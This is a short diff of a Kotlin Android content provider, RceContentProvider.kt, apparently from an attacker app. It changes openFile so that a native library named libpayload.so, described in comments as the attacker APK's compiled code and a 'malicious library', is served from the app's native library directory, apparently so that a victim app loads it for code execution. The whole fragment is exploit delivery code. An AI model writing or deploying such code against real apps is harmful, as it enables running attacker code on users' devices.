@@ -21,11 +21,31 @@ class RceContentProvider : ContentProvider() {
         return cursor
     }
 
+    // In RceContentProvider.kt
+
     override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor? {
-        // This is the path to our compiled C code inside the attacker APK.
-        val libPath = "/data/data/com.artexplorer.museum/lib/libpayload.so"
-        val file = File(libPath)
-        return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY)
+        try {
+            // 1. Get the application context.
+            val appContext = context ?: return null
+
+            // 2.  Use applicationInfo.nativeLibraryDir to get the
+            //    correct, accessible path to the directory containing our .so files.
+            val nativeLibDir = appContext.applicationInfo.nativeLibraryDir
+            val libFile = File(nativeLibDir, "libpayload.so")
+
+            // Log.d("RceContentProvider", "Serving malicious library from path: ${libFile.absolutePath}")
+
+            // 3. Check if the file actually exists before serving it.
+            if (!libFile.exists()) {
+                // Log.e("RceContentProvider", "FATAL: libpayload.so not found at path!")
+                return null
+            }
+
+            return ParcelFileDescriptor.open(libFile, ParcelFileDescriptor.MODE_READ_ONLY)
+        } catch (e: Exception) {
+            // Log.e("RceContentProvider", "Error opening file", e)
+            return null
+        }
     }
 
     override fun onCreate(): Boolean = true
